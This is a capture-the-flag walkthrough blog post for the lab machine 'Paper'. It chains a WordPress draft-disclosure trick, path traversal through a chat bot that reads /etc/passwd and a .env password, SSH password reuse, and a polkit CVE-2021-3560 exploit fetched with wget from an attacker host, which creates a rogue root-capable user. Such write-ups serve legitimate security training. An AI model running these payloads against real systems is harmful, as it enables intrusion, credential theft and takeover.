---
layout: post
title: "paper"
date: 2025-10-07 
categories: OSCP Playlist
---
# paper

# Summary

- Found subdomain from HTTP response header
- wordpress application, comment reveal draft vulnerability; found vulnerability online; could also wpscan to reveal vulnerable version of wordpress to find draft vuln
- draft reveal new subdomain with rocket chat application
- rocket chat application bot has path traversal vulnerability and file read functionality
- found bot password in .env file; password reuse for ssh user
- linpeas to find vulnerable version of polkit
- exploit polkit to get root

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/paper 10.10.11.143

22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE

```

We get the domain name. Let’s add that to our /etc/hosts:

```bash
10.10.11.143 localhost.localdomain
```

From the scan, we also learn the web server is using Apache v2.4.37, and apache uses PHP. 

Let’s visit HTTP first:

```bash
http://localhost.localdomain/
```

![image.png]({{ site.baseurl }}/assets/paper/image.png)

Nothing interesting found in the source code either.

Let’s also fuzz for subdomains:

```bash
ffuf -u http://10.10.11.143 -H "Host: FUZZ.localhost.localdomain" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 199691
```

Nothing.

Let’s also fuzz for subdirecotries. 

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost.localdomain/FUZZ -ic

manual                  [Status: 301, Size: 244, Words: 14, Lines: 8, Duration: 18ms]
```

Nothing interesting. Let’s fuzz for php extensions:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost.localdomain/FUZZ -ic -e .php
```

Nothing. Let’s visit index.php:

![image.png]({{ site.baseurl }}/assets/paper/image%201.png)

Weird response. Because if we try to find another file e.g. index.html

![image.png]({{ site.baseurl }}/assets/paper/image%202.png)

We get URL not found. 

Let’s visit the HTTPS page:

```bash
https://localhost.localdomain
```

![image.png]({{ site.baseurl }}/assets/paper/image%203.png)

It looks to be the same.

Let’s fuzz for https:

```bash
ffuf -u https://10.10.11.143 -H "Host: FUZZ.localhost.localdomain" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 199691
```

Nothing. Let’s look for subdiretories:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://localhost.localdomain/FUZZ -ic
```

Let’s scan more ports:

```bash
sudo nmap -p- 10.10.11.143 -v --min-rate=10000

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

```

No additional ports.

Let’s scan for UDP ports, ports such as SNMP:

```bash
sudo nmap -sU -sC -sV -p 161,162 10.10.11.143 -oN nmap/paper2

PORT    STATE  SERVICE  VERSION
161/udp closed snmp
162/udp closed snmptrap

```

No UDP ports.

It turns out, if we do a normal GET request to index.php, in the response header, it will reveal to us the subdomain:

![image.png]({{ site.baseurl }}/assets/paper/image%204.png)

Let’s add that to our /etc/hosts file and visit the page:

![image.png]({{ site.baseurl }}/assets/paper/image%205.png)

This is a wordpress v5.2.3 application. Let’s run wpscan in the background while we interact with the site:

```bash
sudo wpscan --url http://office.paper -e ap --plugins-detection aggressive

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2022-09-22T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:13:15 <=========================================================> (113372 / 113372) 100.00% Time: 00:13:15
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] stops-core-theme-and-plugin-updates
 | Location: http://office.paper/wp-content/plugins/stops-core-theme-and-plugin-updates/
 | Last Updated: 2025-04-03T00:03:00.000Z
 | Readme: http://office.paper/wp-content/plugins/stops-core-theme-and-plugin-updates/readme.txt
 | [!] The version is out of date, the latest version is 9.0.19
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://office.paper/wp-content/plugins/stops-core-theme-and-plugin-updates/, status: 200
 |
 | Version: 9.0.9 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://office.paper/wp-content/plugins/stops-core-theme-and-plugin-updates/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://office.paper/wp-content/plugins/stops-core-theme-and-plugin-updates/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Oct  7 12:18:55 2025
[+] Requests Done: 113410
[+] Cached Requests: 6
[+] Data Sent: 29.917 MB
[+] Data Received: 22.149 MB
[+] Memory used: 452.25 MB
[+] Elapsed time: 00:13:25

```

![image.png]({{ site.baseurl }}/assets/paper/image%206.png)

Seems like there might be secrets in Michael’s draft. Searching wordpress read draft exploit, we come across this site:

https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/

![image.png]({{ site.baseurl }}/assets/paper/image%207.png)

Let’s try to get the draft:

```bash
http://office.paper/?static=1
```

Output:

```bash

test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!

```

Let’s visit the registration URL; first add the new subdomain to our /etc/hosts file:

```bash
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

![image.png]({{ site.baseurl }}/assets/paper/image%208.png)

![image.png]({{ site.baseurl }}/assets/paper/image%209.png)

In the general chat, it seems like there is bot function:

![image.png]({{ site.baseurl }}/assets/paper/image%2010.png)

We go to direct message, and send commands to recyclops.

It seems the access is only for sale folder

Let’s list the directory:

```bash
list
```

![image.png]({{ site.baseurl }}/assets/paper/image%2011.png)

Let’s try and read a file:

```bash
recyclops file sale_2/portfolio.txt 
```

![image.png]({{ site.baseurl }}/assets/paper/image%2012.png)

Let’s see if it’s vulnerable to path traversing:

```bash
recyclops file sale/../../../../../etc/passwd
```

![image.png]({{ site.baseurl }}/assets/paper/image%2013.png)

It is. Saving the output to a file, let’s grep for users with bash login:

```bash
cat passwd | grep /bin/bash

root❌0:0:root:/root:/bin/bash
rocketchat❌1001:1001::/home/rocketchat:/bin/bash
dwight❌1004:1004::/home/dwight:/bin/bash
```

Let’s look in dwight’s dir, see if we can find a private key:

```bash
list sale/../../../../../home/dwight/
```

![image.png]({{ site.baseurl }}/assets/paper/image%2014.png)

```bash
list sale/../../../../../home/dwight/.ssh

recyclops file sale/../../../../../home/dwight/bot_restart.sh
```

![image.png]({{ site.baseurl }}/assets/paper/image%2015.png)

```bash
list sale/../../../../../home/dwight/hubot

recyclops file sale/../../../../../home/dwight/hubot/start_bot.sh
```

![image.png]({{ site.baseurl }}/assets/paper/image%2016.png)

```bash
recyclops file sale/../../../../../home/dwight/hubot/.env
```

![image.png]({{ site.baseurl }}/assets/paper/image%2017.png)

We now have password for recyclops. 

```bash
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

Let’s sign in to recyclops:

![image.png]({{ site.baseurl }}/assets/paper/image%2018.png)

Let’s try to ssh in as dwight, since he is the creator of recyclops, see if the password is reused:

```bash
ssh dwight@10.10.11.143

#Queenofblad3s!23
```

![image.png]({{ site.baseurl }}/assets/paper/image%2019.png)

We are in. Let’s start default enumeration:

![image.png]({{ site.baseurl }}/assets/paper/image%2020.png)

We are not in any privileged groups.

Let’s enumerate with linpeas:

```bash
Vulnerable to CVE-2021-3560

╔══════════╣ Check for vulnerable cron jobs                                                                                                    
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                           
══╣ Cron jobs list                                                                                                                             
/usr/bin/crontab                                                                                                                               
@reboot /home/dwight/bot_restart.sh >> /home/dwight/hubot/.hubot.log 2>&1      
```

It seems that the machine has a vulnerable version of polkit.

Searching up the CVE, we found this exploit from exploitdb:

https://www.exploit-db.com/exploits/50011

Let’s upload the exploit and see if it works. 

```bash
wget http://10.10.16.9:8002/exploit.sh

chmod +x exploit.sh

dos2unix exploit.sh

./exploit.sh

[*] New user hacked created with uid of 1005
[*] Adding password to /etc/shadow and enabling user
./exploit.sh: line 73: 59760 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2> /dev/null
[*] Exploit complete!
./exploit.sh: line 74: 59765 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2> /dev/null

[*] Run 'su - hacked', followed by 'sudo su' to gain root access
[dwight@paper ~]$ su - hacked

```

Let’s follow the instructions:

```bash
su - hacked #password

sudo su
```

We are now root:

![image.png]({{ site.baseurl }}/assets/paper/image%2021.png)